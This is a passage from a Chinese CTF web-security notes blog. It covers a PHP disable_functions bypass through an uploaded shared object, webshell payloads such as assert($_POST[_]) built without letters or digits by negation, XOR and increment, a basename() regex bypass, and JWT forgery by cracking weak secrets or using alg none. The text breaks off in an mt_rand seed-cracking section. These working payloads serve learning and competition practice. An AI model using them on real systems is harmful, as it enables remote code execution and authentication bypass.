class="line">http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure><p>一是 <code>cmd</code> 参数，待执行的系统命令（如 <code>pwd</code>）；</p><p>二是 <code>outpath</code> 参数，保存命令执行输出结果的文件路径（如<code> /tmp/xx</code>），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、<code>web</code> 是否可跨目录访问、文件将被覆盖和删除等几点；</p><p>三是 <code>sopath</code> 参数，指定劫持系统函数的共享对象的绝对路径（如 <code>/var/www/bypass_disablefunc_x64.so</code>），另外关于该参数，你应注意 <code>web</code> 是否可跨目录访问到它。此外，<code>bypass_disablefunc.php</code> 拼接命令和输出路径成为完整的命令行，所以你不用在 <code>cmd</code> 参数中重定向。</p><p><strong>想办法将 <code>bypass_disablefunc.php</code> 和 <code>bypass_disablefunc_x64.so</code> 传到目标</strong>，指定好三个 GET 参数后，<code>bypass_disablefunc.php</code> 即可突破<code> disable_functions</code>。执行 <code>cat /proc/meminfo</code>：</p><p>具体使用见<a href="4f3ccb8a.html">[极客大挑战 2019]RCE ME</a></p><hr><h1 id="无字母数字的RCE"><a href="#无字母数字的RCE" class="headerlink" title="无字母数字的RCE"></a>无字母数字的RCE</h1><h2 id="1取反绕过"><a href="#1取反绕过" class="headerlink" title="1取反绕过"></a>1取反绕过</h2><p><strong>取反运算(化成2进制之后,0变1,1变0),所以每一个字符在取反之后都会变成别的字符</strong></p><p>例如需要通过取反来构造: <code>assert(eval($_GET[_]))</code>那么就可以:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~&quot;assert&quot;);</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo urlencode(~&quot;eval(\$_GET[_])&quot;);</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">得到:</span><br><span class="line">%9E%8C%8C%9A%8D%8B --assert</span><br><span class="line">%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6 --eval(\$_POST[1])</span><br><span class="line"></span><br><span class="line">那么: assert(eval($_POST[1]));就是:</span><br><span class="line">(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4);</span><br><span class="line"></span><br><span class="line">接下来再从POST中给1这个参数传具体命令,就可以执行了</span><br></pre></td></tr></table></figure><h2 id="2异或绕过"><a href="#2异或绕过" class="headerlink" title="2异或绕过"></a>2异或绕过</h2><p><code>php</code>中可以将两个字符按位异或, 就是相同则为0,不同则为1</p><p>那么我们可以通过非字母数字的字符进行异或而得到字母或数字:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 通过GET来传我们需要转换的字母</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;char&#x27;</span>];</span><br><span class="line"><span class="comment"># 取所有非字母数字字符的ascii码</span></span><br><span class="line"><span class="variable">$ascii_num</span> = <span class="title function_ invoke__">array_merge</span>(<span class="title function_ invoke__">range</span>(<span class="number">33</span>,<span class="number">47</span>),<span class="title function_ invoke__">range</span>(<span class="number">58</span>,<span class="number">64</span>),<span class="title function_ invoke__">range</span>(<span class="number">91</span>,<span class="number">96</span>),<span class="title function_ invoke__">range</span>(<span class="number">123</span>,<span class="number">126</span>));</span><br><span class="line"><span class="comment"># var_dump($ascii_num);</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$ascii_num</span> <span class="keyword">as</span> <span class="variable">$char1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$ascii_num</span> <span class="keyword">as</span> <span class="variable">$char2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$char1</span>) ^ <span class="title function_ invoke__">chr</span>(<span class="variable">$char2</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span>==<span class="variable">$a</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$char1</span>).<span class="string">&#x27;^&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$char2</span>).<span class="string">&#x27;=&#x27;</span>.<span class="variable">$res</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$char1</span>)).<span class="string">&#x27;^&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$char2</span>)).<span class="string">&#x27;=&#x27;</span>.<span class="variable">$res</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#echo &#x27;&#125;&#x27; ^ &#x27;:&#x27;;</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>例如要构造<code>assert($_POST[_])</code> 这里将字符<code>url</code>编码一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a:&#x27;%40&#x27;^&#x27;%21&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; e:&#x27;%7B&#x27;^&#x27;%1E&#x27; ; r:&#x27;%7E&#x27;^&#x27;%0C&#x27; ; t:&#x27;%7C&#x27;^&#x27;%08&#x27;</span><br><span class="line">P:&#x27;%0D&#x27;^&#x27;%5D&#x27; ; O:&#x27;%0F&#x27;^&#x27;%40&#x27; ; S:&#x27;%0E&#x27;^&#x27;%5D&#x27; ; T:&#x27;%0B&#x27;^&#x27;%5F&#x27;</span><br><span class="line">拼接起来：字符之间用.来连接</span><br><span class="line">$_=(&#x27;%40&#x27;^&#x27;%21&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%1E&#x27;).(&#x27;%7E&#x27;^&#x27;%0C&#x27;).(&#x27;%7C&#x27;^&#x27;%08&#x27;);  // $_=assert</span><br><span class="line">$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;%5D&#x27;).(&#x27;%0F&#x27;^&#x27;%40&#x27;).(&#x27;%0E&#x27;^&#x27;%5D&#x27;).(&#x27;%0B&#x27;^&#x27;%5F&#x27;);  // $__=_POST</span><br><span class="line">$___=$$__; //$___=$_POST</span><br><span class="line">$_($___[_]);//assert($_POST[_]);</span><br><span class="line">放到一排就是：</span><br><span class="line">$_=(&#x27;%40&#x27;^&#x27;%21&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%1E&#x27;).(&#x27;%7E&#x27;^&#x27;%0C&#x27;).(&#x27;%7C&#x27;^&#x27;%08&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;%5D&#x27;).(&#x27;%0F&#x27;^&#x27;%40&#x27;).(&#x27;%0E&#x27;^&#x27;%5D&#x27;).(&#x27;%0B&#x27;^&#x27;%5F&#x27;);$___=$$__;$_($___[_]);</span><br><span class="line">翻译过来就是:</span><br><span class="line">$_=assert;$__=_POST;$___=$$__;$_($___[_]);</span><br><span class="line"></span><br><span class="line">$$__ 也即是$_POST</span><br></pre></td></tr></table></figure><h2 id="3自增绕过"><a href="#3自增绕过" class="headerlink" title="3自增绕过"></a>3自增绕过</h2><p>PHP中, 若有<code>$a = &#39;a&#39;; $a++;</code>则将得到<code>b</code>, 大写字母也是一样</p><p>也就是说，只要我们获得了小写字母<code>a</code>，就可以通过自增获得所有小写字母，当我们获得大写字母<code>A</code>，就可以获得所有大写字母了</p><p>而如果强制连接数组和字符串, 数组就会被强制转换成字符串，它的值就为<code>&#39;Array&#39;</code>, 那么就可以通过<code>&#39;Array&#39;</code>来拿到<code>a</code>和<code>A</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = [];</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>[<span class="number">0</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>[<span class="number">3</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="variable">$c</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$d</span> ++;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出:</span></span><br><span class="line"><span class="comment">//Array</span></span><br><span class="line"><span class="comment">//A</span></span><br><span class="line"><span class="comment">//a</span></span><br><span class="line"><span class="comment">//B</span></span><br></pre></td></tr></table></figure><p>逐个字母构造<code>ASSERT($_POST[_]);</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure><p>有点太长了…</p><h1 id="jsfuck编码"><a href="#jsfuck编码" class="headerlink" title="jsfuck编码"></a>jsfuck编码</h1><p><img src="file:///F:/blog/source/images/buuctf-web2/image-20221025094059162.png?lastModify=1666659384" alt="image-20221025094059162"></p><blockquote><p><strong>这一串是<code>jsfuck</code>代码,将一切的<code>JavaScript</code>代码混淆为<code>[]()!+,\&quot;$.:;_&#123;&#125;~=</code>这十八个字符的排列组合</strong></p><p><strong>这些代码是直接可以在控制台执行的,也可以到网站上解码得到能读的js编码</strong></p></blockquote><hr><h1 id="basename-函数删除部分字符特性"><a href="#basename-函数删除部分字符特性" class="headerlink" title="basename()函数删除部分字符特性"></a>basename()函数删除部分字符特性</h1><p><code>basename</code>函数用于返回路径中的文件名部分,例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">basename(&quot;/testweb/home.php&quot;) = &quot;home.php&quot;</span><br><span class="line"></span><br><span class="line">如果设置了扩展名,则输出是不包含扩展名</span><br><span class="line">basename(&quot;/testweb/home.php&quot;,&quot;.php&quot;) = &quot;home&quot;</span><br></pre></td></tr></table></figure><p><code>basename</code>在解析文件路径时,会忽略一部分非<code>ASCII</code>字符</p><p>可以测试以下有哪些字符会被忽略:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">255</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$filename</span>.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);    <span class="comment">//变为 index/某字符</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>) === <span class="string">&quot;index.php&quot;</span>)&#123;  <span class="comment">//如果basename将&quot;/某字符&quot;删除, 则说明这个字符会被其忽略</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$i</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果显示: <code>ascii</code>值为47、128-255的字符均会被其删除,其中47为”&#x2F;“, 另外会被删除的还包括汉字和中文标点</p><p>这样以来,如<a href="4f3ccb8a.html">[Zer0pts2020]Can you guess it</a></p><p>可以在文件名后面加上会被<code>basename</code>删除的字符来绕过正则匹配</p><h1 id="JWT伪造"><a href="#JWT伪造" class="headerlink" title="JWT伪造"></a>JWT伪造</h1><blockquote><p><code>JWT</code>的全称是<code>JSON Web Token</code>。遵循<code>JSON</code>格式，跨域认证解决方案。声明被存储在<code>客户端</code>，而不是服务端内存中。服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于<code>token</code>的身份验证可以替代传统的cookie+session身份验证方法。</p><p>整个<code>token</code>由三部分组成:<code>header</code>、<code>payload</code>、<code>signature</code>(用于认证信息的完整性)</p><p>其中,<code>header</code>的格式为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span>   <span class="comment">//signature部分的加密算法,可以为None,</span></span><br><span class="line"> <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span>      <span class="comment">//声明类型为JWT</span></span><br><span class="line">&gt;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>payload</code>格式为:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;user_role&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;finn&quot;</span><span class="punctuation">,</span>    <span class="comment">//当前登录用户</span></span><br><span class="line">   <span class="attr">&quot;iss&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span>          <span class="comment">//该JWT的签发者,有些是URL</span></span><br><span class="line">   <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1573440582</span><span class="punctuation">,</span>        <span class="comment">//签发时间</span></span><br><span class="line">   <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1573940267</span><span class="punctuation">,</span>        <span class="comment">//过期时间</span></span><br><span class="line">   <span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span> <span class="number">1573440582</span><span class="punctuation">,</span>        <span class="comment">//该时间之前不接收处理该Token</span></span><br><span class="line">   <span class="attr">&quot;domain&quot;</span><span class="punctuation">:</span> <span class="string">&quot;example.com&quot;</span><span class="punctuation">,</span>   <span class="comment">//面向的用户</span></span><br><span class="line">   <span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dff4214121e83057655e10bd9751d657&quot;</span>   <span class="comment">//Token唯一标识</span></span><br><span class="line">&gt;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>signature</code>通过指定的加密算法, <strong>以及一个用户指定的<code>secret_key</code>,</strong> 对<code>header</code>、<code>payload</code>两部分进行计算得到. 签名可以为空,如果这样设置, 任何token都可以通过服务器的认证</p><p><code>header</code>、<code>payload</code>使用<code>base64url</code>编码, 所以和明文没什么区别</p></blockquote><p>使用<code>c-jwt-cracker</code>工具可以对用于计算<code>signature</code>进行爆破 (只能爆破弱密钥)</p><p>使用<code>jwt_tool</code>可以对<code>JWT token</code>进行解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/c-jwt-cracker/c-jwt-cracker]</span><br><span class="line">└─$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjIyMiJ9.3H1j76lr69MYIZ48VY1Jdrjpw-GZdPSSbEwpE0gCR8o   </span><br><span class="line">Secret is &quot;1Kun&quot;</span><br><span class="line"></span><br><span class="line">python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.03HaDCk7C7vfJw9Wa-yDflSMoeV_1jpCaTILcgJXpZY</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/ctfweb-others/image-20221025193722302.png" alt="image-20221025193722302"></p><p><a href="https://jwt.io/">https://jwt.io/</a></p><p>假如某个网站要求认证<code>admin</code>才能访问, 这里拿到爆破所得的<code>secret_key</code>, 并在解密后将<code>payload</code>中的<code>username</code>字段的值改为<code>admin</code></p><p>从而计算得到一个新的<code>JWT token</code></p><img src="/images/ctfweb-others/image-20221025194112546.png" alt="image-20221025194112546" style="zoom:67%;" /><p>将新<code>token</code>替换<code>cookie</code>中旧的<code>token</code>后,成功访问到目标网页</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</span><br></pre></td></tr></table></figure><h2 id="使用python来计算新的token"><a href="#使用python来计算新的token" class="headerlink" title="使用python来计算新的token:"></a><strong>使用<code>python</code>来计算新的<code>token</code>:</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda install PyJWT</span><br><span class="line">or</span><br><span class="line">pip3 install PyJWT</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jwtencode</span>():</span><br><span class="line">    token = jwt.encode(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;secretid&quot;</span>: [],</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;111&quot;</span>,</span><br><span class="line">            <span class="string">&quot;iat&quot;</span>: <span class="number">1666939131</span></span><br><span class="line">        &#125;,</span><br><span class="line">        algorithm=<span class="string">&quot;none&quot;</span>, key=<span class="string">&quot;&quot;</span></span><br><span class="line">    ).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(token)</span><br><span class="line">jwtencode()</span><br></pre></td></tr></table></figure><hr><h1 id="mt-rand伪随机数爆破"><a href="#mt-rand伪随机数爆破" class="headerlink" title="mt_rand伪随机数爆破"></a>mt_rand伪随机数爆破</h1><blockquote><p>伪随机数是用确定性的算法计算出来的随机数序列，它并不真正的随机，但具有类似于随机数的统计特征，如均匀性、独立性等。在计算伪随机数时，<span style='color:black;background:yellow;font-family:hei;font-weight:bold'>若使用的初值（种子）不变，那么伪随机数的数序也不变</span>:。伪随机数可以用计算机大量生成，在模拟研究中为了提高模拟效率，一般采用伪随机数代替真正的随机数。模拟中使用的一般是循环周期极长并能通过随机数检验的伪随机数，以保证计算结果的随机性。伪随机数的生成方法有线性同余法、单向散列函数法、密码法等。</p><p><strong><code>mt_rand</code>就是一个伪随机数生成函数，它由可确定的函数，通过一个种子产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。</strong></p></blockquote><p><span style='color:black;background:yellow;font-family:hei;font-weight:bold'>也就是说,对于同一个<code>mt_srand(种子)</code>生成的种子, 后续每次调用<code>mt_rand</code>生成的随机数顺序都是固定的,例如第一次固定生成3,第二次固定生成20….</span></p><p>这里可以用<code>php_mt_seed</code>来爆破种子, 有两种类型的数据可以提交, 一是某个种子的第一个<code>mt_rand</code>生成出来的完整数, 